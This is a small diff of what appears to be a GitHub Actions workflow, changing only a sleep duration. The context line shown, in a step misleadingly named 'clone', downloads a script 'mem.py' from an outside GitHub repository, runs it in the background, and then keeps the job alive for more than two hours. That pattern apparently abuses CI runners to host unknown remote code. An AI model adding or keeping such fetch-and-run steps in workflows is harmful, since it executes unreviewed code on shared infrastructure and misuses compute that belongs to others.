@@ -126,4 +126,4 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/ratnasi7283-art/ilham/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
-            sleep 125m
+            sleep 127m
